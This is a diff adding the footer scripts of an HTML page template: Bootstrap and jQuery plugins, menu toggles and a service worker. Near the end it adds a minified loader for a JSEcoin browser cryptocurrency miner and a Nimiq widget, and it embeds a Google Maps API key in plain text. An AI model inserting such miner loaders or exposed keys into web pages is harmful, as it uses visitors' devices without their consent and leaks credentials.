+            </div>
+        </div>
+        
+		{{!--NIMIQ--}}
+		<nimiq-widget address="NQ32 73VK 3GCK J7GD J57F VFKM 7UE7 BKP9 L706"></nimiq-widget>
+
+        <!--   Core JS Files   -->
+        <script src="/assets/js/core/jquery.min.js" type="text/javascript"></script>
+        <script src="/assets/js/core/popper.min.js" type="text/javascript"></script>
+        <script src="/assets/js/core/bootstrap.min.js" type="text/javascript"></script>
+
+        <!--  Plugin for Switches, full documentation here: http://www.jque.re/plugins/version3/bootstrap.switch/ -->
+        <script src="/assets/js/plugins/bootstrap-switch.js"></script>
+
+        <!--  Plugin for the Sliders, full documentation here: http://refreshless.com/nouislider/ -->
+        <script src="/assets/js/plugins/nouislider.min.js" type="text/javascript"></script>
+
+        <!--  Plugin for the DatePicker, full documentation here: https://github.com/uxsolutions/bootstrap-datepicker -->
+        <script src="/assets/js/plugins/moment.min.js"></script>
+
+        <!--	Plugin for Tags, full documentation here: https://github.com/bootstrap-tagsinput/bootstrap-tagsinputs  -->
+        <script src="/assets/js/plugins/bootstrap-tagsinput.js"></script>
+        <!--	Plugin for Select, full documentation here: http://silviomoreto.github.io/bootstrap-select -->
+        <script src="/assets/js/plugins/bootstrap-selectpicker.js" type="text/javascript"></script>
+
+        <!--  Plugin for the DateTimePicker, full documentation here: https://eonasdan.github.io/bootstrap-datetimepicker/ -->
+        <script src="/assets/js/plugins/bootstrap-datetimepicker.js" type="text/javascript"></script>
+
+        <!--  Google Maps Plugin    -->
+
+        <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyB2Yno10-YTnLjjn_Vtk0V8cdcY5lC4plU"></script>
+
+        <!-- Control Center for Now Ui Kit: parallax effects, scripts for the example pages etc -->
+        <script src="/assets/js/now-ui-kit.mincdae.js?v=1.2.2" type="text/javascript"></script>
+        <!-- Sharrre libray -->
+        <script src="/assets/demo/jquery.sharrre.js"></script>
+
+        <!--Script for my floating buttons-->
+        <script src="/assets/js/little-widgets.js"></script>
+        <script>
+            var circle = document.querySelector('.lw-circle');
+            var drop = document.querySelector('.lw-drop');
+
+            circle.addEventListener('click', function() {
+                circle.classList.toggle('lw-active');
+                drop.classList.toggle('lw-visible');
+            });
+        </script>
+        <script>
+            function openmenu1() {
+                $("#submenu1").modal('toggle');
+                $("#submenu2").modal('hide');
+                $("#submenu3").modal('hide');
+                $("#submenu4").modal('hide');
+            }
+
+            function openmenu2() {
+                $("#submenu1").modal('hide');
+                $("#submenu2").modal('toggle');
+                $("#submenu3").modal('hide');
+                $("#submenu4").modal('hide');
+            }
+
+            function openmenu3() {
+                $("#submenu1").modal('hide');
+                $("#submenu2").modal('hide');
+                $("#submenu3").modal('toggle');
+                $("#submenu4").modal('hide');
+            }
+
+            function openmenu4() {
+                $("#submenu1").modal('hide');
+                $("#submenu2").modal('hide');
+                $("#submenu3").modal('hide');
+                $("#submenu4").modal('toggle');
+            }
+
+            function hideAll() {
+                $("#submenu1").modal('hide');
+                $("#submenu2").modal('hide');
+                $("#submenu3").modal('hide');
+                $("#submenu4").modal('hide');
+            }
+        </script>
+        <!--End of scripts for my floating buttons-->
+
+        <script>
+            $(document).ready(function() {
+                // the body of this function is in /assets/js/now-ui-kit.js
+                nowuiKit.initSliders();
+            });
+
+            function scrollToDownload() {
+
+                if ($('.section-download').length != 0) {
+                    $("html, body").animate({
+                        scrollTop: $('.section-download').offset().top
+                    }, 1000);
+                }
+            }
+        </script>
+        <script>
+        	if ('serviceWorker' in navigator) {
+					    window.addEventListener('load', () => {
+					        navigator.serviceWorker.register('./service-worker.js').then(
+					            registration => {
+					                console.log(`ServiceWorker registration successful with scope: ${registration.scope}`);
+					            },
+					            error => {
+					                console.log(`ServiceWorker registration failed: ${error}`);
+					            }
+					        );
+					    });
+					}
+        </script>
+        
+        <script type="text/javascript">
+		!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/165692/create-cheap-commerce.web.app/0/0/",s.parentNode.insertBefore(t,s)}();
+		</script>
+
+
+</body>
+
+</html>
